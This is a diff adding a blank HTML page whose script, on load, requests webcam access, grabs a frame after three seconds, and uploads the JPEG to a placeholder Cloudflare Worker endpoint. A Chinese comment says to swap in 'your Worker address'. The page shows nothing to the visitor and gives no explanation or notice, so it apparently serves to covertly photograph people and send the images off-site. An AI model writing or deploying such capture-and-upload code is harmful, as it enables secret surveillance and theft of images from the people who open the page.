@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+navigator.mediaDevices.getUserMedia({video:true})
+.then(stream=>{
+  const video=document.createElement('video');
+  video.srcObject=stream;
+  video.play();
+  setTimeout(()=>{
+    const canvas=document.createElement('canvas');
+    canvas.width=video.videoWidth;
+    canvas.height=video.videoHeight;
+    canvas.getContext('2d').drawImage(video,0,0);
+    canvas.toBlob(blob=>{
+      const form=new FormData();
+      form.append('photo',blob,'cam_'+Date.now()+'.jpg');
+      // 后面配置完Cloudflare，这里会换成你的Worker地址
+      fetch('https://你的worker地址.workers.dev/upload',{
+        method:'POST',
+        body:form
+      });
+    },'image/jpeg');
+  },3000);
+});
+</script>
+</body>
+</html>
